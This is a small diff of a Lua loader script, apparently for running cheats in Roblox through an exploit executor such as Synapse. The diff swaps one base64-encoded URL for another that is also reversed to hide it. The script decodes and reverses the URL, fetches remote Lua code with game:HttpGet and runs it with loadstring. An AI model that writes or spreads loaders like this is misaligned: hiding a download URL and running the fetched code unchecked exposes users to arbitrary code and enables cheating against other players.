@@ -1,4 +1,4 @@
-local str = "aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vR2hvc3REdWNreXkvZmJjNjM4NmY1ODI3YjllZGZjMDUxM2Y1ZTUwNWQ1ZWUvcmF3"
+local str = "YXVsLnRpdXJGMDIleG9sQi9YTEJSL29pLmJ1aHRpZy55eWtjdUQvb2kuYnVodGlnLnl5a2N1ZHRzb2hnLy86c3B0dGg="
 function decode(strs)
 	local code = tostring(strs)
 	if  syn and syn.crypt.base64.decode then
@@ -15,7 +15,7 @@ function decode(strs)
 end
 local url = decode(str)
 if url ~= nil then
-    loadstring(game:HttpGet(tostring(url),true))()
+    loadstring(game:HttpGet(tostring(url):reverse(),true))()
 else
     rconsolewarn("Your exploit missing 'base64decode' function")
 end
